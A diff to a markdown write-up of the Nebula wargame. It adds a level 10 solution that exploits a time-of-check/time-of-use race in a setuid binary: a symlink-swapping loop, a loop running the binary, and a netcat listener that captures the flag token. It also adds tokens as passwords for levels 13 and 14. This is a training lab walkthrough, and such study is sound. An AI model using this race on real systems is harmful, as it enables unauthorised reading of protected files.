@@ -5,6 +5,56 @@ nebula-exercises
 > [ref: exploit-exercises.com/nebula/](https://exploit-exercises.com/nebula/)
 
 
+level 10
+--------
+
+##### see man access
+```bash
+level10@nebula:~$ man access
+The  check is done using the calling process's real UID and GID, rather than the effective IDs as
+is done when actually attempting an operation (e.g., open(2)) on the file.  This allows set-user-
+ID programs to easily determine the invoking user's authority.
+
+# however:
+
+Warning: Using access() to check if a user is authorized to, for  example,  open  a  file  before
+actually doing so using open(2) creates a security hole, because the user might exploit the short
+time interval between checking and opening the file to manipulate it.  For this reason,  the  use
+of this system call should be avoided.
+
+# --> exploit short time between:
+# --> access(argv[1], R_OK) == 0 and ffd = open(file, O_RDONLY)
+# --> to read /home/flag10/token with flag10 suid binary
+```
+
+##### run one loop to link a fake token with the real one
+```bash
+level10@nebula:~$ while true; do touch f_token; ln -sf /home/flag10/token f_token; rm f_token; done &
+```
+
+##### run another loop to read the real token with flag10 binary via the fake one
+```bash
+level10@nebula:~$ while true; do /home/flag10/flag10 f_token 127.0.0.1; done &
+```
+
+##### open a server tcp connection listening on port 18211 and wait for the real token
+```bash
+level10@nebula:~$ nc -kl localhost 18211
+.oO Oo.
+615a2ce1-b2b5-4c76-8eed-8aa5c4015c27
+.oO Oo.
+.oO Oo.
+```
+
+##### use token as pwd for flag10 user and execute getflag
+```bash
+level10@nebula:~$ su - flag10
+Password: # 615a2ce1-b2b5-4c76-8eed-8aa5c4015c27
+flag10@nebula:~$ getflag 
+You have successfully executed getflag on a target account
+```
+
+
 level 11
 --------
 
@@ -89,7 +139,7 @@ your token is b705702b-76a8-42b0-8844-3adabbe5ac58
 ##### use token as pwd for flag13 user and execute getflag
 ```bash
 level13@nebula:~$ su - flag13
-Password: 
+Password: # b705702b-76a8-42b0-8844-3adabbe5ac58
 flag13@nebula:~$ getflag 
 You have successfully executed getflag on a target account
 ```
@@ -133,7 +183,7 @@ python reverse.py | /home/flag14/flag14 -e
 ##### use reversed token as pwd for flag14 user and execute getflag
 ```
 level14@nebula:~$ su - flag14
-Password: 
+Password: # 8457c118-887c-4e40-a5a6-33a25353165
 flag14@nebula:~$ getflag 
 You have successfully executed getflag on a target account
 ```
